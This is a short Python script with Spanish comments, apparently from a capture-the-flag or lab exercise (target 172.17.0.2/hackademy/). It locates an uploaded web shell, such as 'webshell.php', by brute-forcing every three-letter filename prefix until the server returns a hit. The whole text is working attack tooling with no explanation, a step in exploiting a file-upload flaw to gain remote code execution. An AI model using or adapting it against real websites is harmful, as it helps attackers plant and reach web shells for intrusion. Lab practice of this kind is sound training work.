import itertools
import string
import requests
import sys

# Configuración
url_base = "http://172.17.0.2/hackademy/"

# Pedir al usuario el nombre del archivo que ha subido
file_name = input("Introduce el nombre del archivo que has subido (por ejemplo, webshell.php): ")

# Verificar si el flag -v está presente
verbose = "-v" in sys.argv

# Generar todas las combinaciones posibles de tres letras
prefixes = [''.join(i) for i in itertools.product(string.ascii_lowercase, repeat=3)]

# Probar cada combinación
for prefix in prefixes:
    url = f"{url_base}{prefix}_{file_name}"
    if verbose:
        print(f"Trying: {url}")
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Found: {url}")
            break
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")
